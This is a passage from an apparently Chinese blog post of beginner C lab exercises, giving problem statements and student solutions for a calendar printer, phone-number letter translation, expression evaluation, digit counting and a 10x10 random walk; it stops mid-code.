class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">outputCalender</span><span class="hljs-params">(<span class="hljs-type">int</span> days, <span class="hljs-type">int</span> start)</span><br>&#123;<br>    start %= <span class="hljs-number">8</span>;<br>    <span class="hljs-type">int</span> counts = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// printf(&quot;日\t一\t二\t三\t四\t五\t六\n&quot;);</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (days + start - <span class="hljs-number">1</span>) / <span class="hljs-number">7</span> + <span class="hljs-number">1</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">7</span>; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> ((i == <span class="hljs-number">0</span> &amp;&amp; j &lt; start - <span class="hljs-number">1</span>) || counts &gt; days)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t&quot;</span>);<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\t&quot;</span>, counts++);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> days, start;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;days);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;start);<br>    outputCalender(days, start);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h2><h3 id="翻译（Translation）"><a href="#翻译（Translation）" class="headerlink" title="翻译（Translation）"></a>翻译（Translation）</h3><blockquote><p>编写程序可以把字母格式的电话号码翻译成数值格式：</p><blockquote><p>Enter phone number: CALLATT</p><p>2255288</p></blockquote><p>如果没有电话在身边,参考这里给出的字母在键盘上的对应关系：（2&#x3D;ABC，3&#x3D;DEF，4&#x3D;GHI，5&#x3D;JKL，6&#x3D;MNO，7&#x3D;PQRS，8&#x3D;TUV，9&#x3D;WXYZ）原始电话号码中的非字母字符（例如数字或标点符号）保持不变：</p><p>Enter phone number: 1-800-COL-LECT1-800-265-5328</p><p>可以假设任何用户输入的字母都是大写字母。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter phone number: 1-DCKS-A2D-OLED</p><p>1-3257-223-6533</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-comment">// 貌似有点笨这方法</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;A&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;B&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;2&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;F&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;3&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;G&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;H&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;I&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;4&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;J&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;K&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;5&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;N&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;O&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;6&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;P&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Q&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;R&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;7&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;T&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;V&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;U&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;8&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Y&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;W&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;X&#x27;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">putchar</span>(ch);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="表达式求值（Expression-Evaluation）"><a href="#表达式求值（Expression-Evaluation）" class="headerlink" title="表达式求值（Expression Evaluation）"></a>表达式求值（Expression Evaluation）</h3><blockquote><p>编写程序对表达式求值。</p><blockquote><p>Enter an expression: 1+2.5*3<br>Value of expression: 10.5</p></blockquote><p>表达式中的操作数是浮点数，运算符是+、-、*和&#x2F;。表达式从左向右求值（所有运算符的优先级都⼀样）。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter an expression: 2+3*4-5&#x2F;2<br>Value of expression: 7.5</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-type">float</span> num, num2;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num);<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%f&quot;</span>, &amp;num2);<br>        <span class="hljs-keyword">switch</span> (ch)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>            num += num2;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>            num -= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>            num *= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/&#x27;</span>:<br>            num /= num2;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="出现次数（Number-Occurrences）"><a href="#出现次数（Number-Occurrences）" class="headerlink" title="出现次数（Number Occurrences）"></a>出现次数（Number Occurrences）</h3><blockquote><p>修改如下程序，使其打印⼀份列表，显示出每个数字在数中出现的次数。</p><p><em><strong>输出范例：</strong></em></p><blockquote><p>Enter a number: 41271092</p><table><thead><tr><th align="center">Digit:</th><th align="center">0</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th></tr></thead><tbody><tr><td align="center">Occurrences:</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">0</td><td align="center">1</td><td align="center">0</td><td align="center">1</td></tr></tbody></table></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> occ[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Digit:0123456789&quot;</span>);<br>    <span class="hljs-keyword">while</span> ((num = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (num)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>            occ[<span class="hljs-number">0</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>            occ[<span class="hljs-number">1</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>            occ[<span class="hljs-number">2</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>            occ[<span class="hljs-number">3</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>            occ[<span class="hljs-number">4</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;5&#x27;</span>:<br>            occ[<span class="hljs-number">5</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;6&#x27;</span>:<br>            occ[<span class="hljs-number">6</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;7&#x27;</span>:<br>            occ[<span class="hljs-number">7</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;8&#x27;</span>:<br>            occ[<span class="hljs-number">8</span>]++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;9&#x27;</span>:<br>            occ[<span class="hljs-number">9</span>]++;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Occurrences:&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, occ[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="随机步法（Random-Walk）"><a href="#随机步法（Random-Walk）" class="headerlink" title="随机步法（Random Walk）"></a>随机步法（Random Walk）</h3><blockquote><p>编写程序，生成一种贯穿10×10字符数组（初始时全为字符’.’）的“随机步法”。程序必须随机地从一个元素“走到”另一个元素，每次都向上、向下、向左或向右移动一个元素位置。已访问过的元素按访问顺序用字母A到Z进行标记。</p><p>下面是一个<em><strong>输出示例：</strong></em></p><table><thead><tr><th align="center">A</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">F</td><td align="center">E</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">H</td><td align="center">G</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">I</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">J</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">Z</td><td align="center">.</td></tr><tr><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">R</td><td align="center">S</td><td align="center">T</td><td align="center">U</td><td align="center">V</td><td align="center">Y</td><td align="center">.</td></tr><tr><td align="center">L</td><td align="center">M</td><td align="center">P</td><td align="center">Q</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">W</td><td align="center">X</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">N</td><td align="center">O</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>利用srand函数和rand函数产生随机数，然后查看次数除以4的余数。余数一共有4种可能的值（0、1、2和3），指示下一次移动的4种可能方向。在执行移动之前，需要检查两项内容：一是不能走到数组外面，二是不能走到已有字母标记的位置。只要一个条件不满足，就得尝试换一个方向移动。如果4个方向都堵住了，程序就必须终止了。下面是提前结束的一个示例:</p><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">G</th><th align="center">H</th><th align="center">I</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th><th align="center">.</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">C</td><td align="center">F</td><td align="center">O</td><td align="center">J</td><td align="center">K</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">D</td><td align="center">E</td><td align="center">N</td><td align="center">M</td><td align="center">L</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr><tr><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td><td align="center">.</td></tr></tbody></table><p>因为Y的4个方向都堵住了，所以没有地方可以放置下一步的Z了。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PrintMap</span><span class="hljs-params">(<span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, Map[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">SelectToward</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>], <span class="hljs-type">int</span> toward, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> boom)</span><br>&#123;<br><br>    boom++;<br>    <span class="hljs-type">char</span> alphabet[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    <span class="hljs-keyword">switch</span> (toward)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>][begin[<span class="hljs-number">1</span>]] = alphabet[index];<br>            begin[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], Map[begin[0]][begin[1] + 1]);</span><br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span 